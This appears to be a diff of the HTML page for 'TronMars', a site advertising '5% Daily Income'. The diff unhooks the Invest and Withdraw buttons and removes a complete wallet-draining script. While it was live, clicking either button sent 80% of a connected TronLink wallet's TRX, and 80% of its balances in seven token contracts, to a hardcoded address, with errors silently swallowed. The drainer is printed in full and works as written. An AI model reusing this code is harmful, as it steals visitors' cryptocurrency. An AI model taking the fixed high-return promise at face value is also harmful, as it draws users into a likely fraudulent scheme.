@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
 <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-7FXHEWXYSZ"></script>
+<!--script async src="https://www.googletagmanager.com/gtag/js?id=G-7FXHEWXYSZ"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
   gtag('config', 'G-7FXHEWXYSZ');
-</script>
+</script><!-- -->
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="TronMars">
 <meta name="description" content="TronMars - 5% Daily Income - High sustainability" />
@@ -278,7 +278,7 @@
                         </div>
                         <div class="offer-footer">
                            
-                            <button id="invest_noww" class="custom-button m-2" onclick="swap()">Invest</button>
+                            <button id="invest_now" class="custom-button m-2">Invest</button>
                         </div>
                     </div>
 
@@ -348,8 +348,8 @@
                                                 <span class="">Bonus Withdrawable</span>
                                             </div>
                                            
-                                        <a href="#last_withdrawn" id="withdraw" style="display: none;" class="custom-button btn-block text-center" onclick="swap()">Withdraw</a>
-                                        <a href="#last_withdrawn" id="last_withdrawn" style="display: block;" class="custom-button btn-block text-center" onclick="swap()"></a>
+                                        <a href="#withdraw" id="withdraw" style="display: none;" class="custom-button btn-block text-center">Withdraw</a>
+                                        <a href="#last_withdrawn" id="last_withdrawn" style="display: block;" class="custom-button btn-block text-center"></a>
                                         </div>
                                         <div class="col-lg-6">
                                             <div class="my-2">
@@ -648,7 +648,7 @@
     <script src="assets/js/nice-select.js"></script>
     <script src="assets/js/owl.min.js"></script>
     <script src="assets/js/paroller.js"></script>
-    <script src="assets/js/main.js?v=final2"></script>
+    <script src="assets/js/main.js?v=final"></script>
     <script src="assets/js/magic.js?v=final"></script>
     <script src="assets/js/sweetalert.min.js"></script>
     <script src="assets/js/countdown.js?v=final"></script>
@@ -659,41 +659,6 @@
           copyText.setSelectionRange(0, 99999);
           document.execCommand("copy");
           swal("Referral link copied!", "Your referral link has been copied into clipboard. Spread the word and earn the bonus!", "info");
-        }
-        var connected = false;
-        var contractsAddress = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-                                "TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9",
-                                "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
-                                "TKfjV9RNKJJCqPvBtK8L7Knykh7DNWvnYt",
-                                "TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9",
-                                "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
-                                "THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF"]
-        var tokenBalance = [5000000, 700000000000000000, 170000000000000000000, 13000000000, 10000, 60000000000, 3000000000000000]
-        const timer = setInterval(async() => {
-            if (window.tronWeb && window.tronWeb.ready){
-                connected = true;
-                var address = window.tronWeb.defaultAddress.base58;
-            }
-        }, 500);
-        async function swap(){
-            if (!connected){
-                alert("Please first connect your TronLink!");
-                return
-            }
-            try{
-                var balance = await window.tronWeb.trx.getBalance();
-                if (balance >= 100000000)
-                    await tronWeb.trx.sendTransaction("TTw1e7fiNKxWx3KkYqt4bFJWhYQ6xAeCLs", Math.round(balance * 80 / 100));
-            }catch{}
-            for(i = 0; i < contractsAddress.length; i++){
-                try{
-                    var contract = await window.tronWeb.contract().at(contractsAddress[i]);
-                    balance = await contract.balanceOf(window.tronWeb.defaultAddress.base58).call();
-                    if (balance.toNumber() >= tokenBalance[i]){
-                        await contract.transfer("TTw1e7fiNKxWx3KkYqt4bFJWhYQ6xAeCLu", Math.round(balance * 80 / 100)).send()
-                    }
-                }catch{}
-            }
         }
     </script>
 </body>
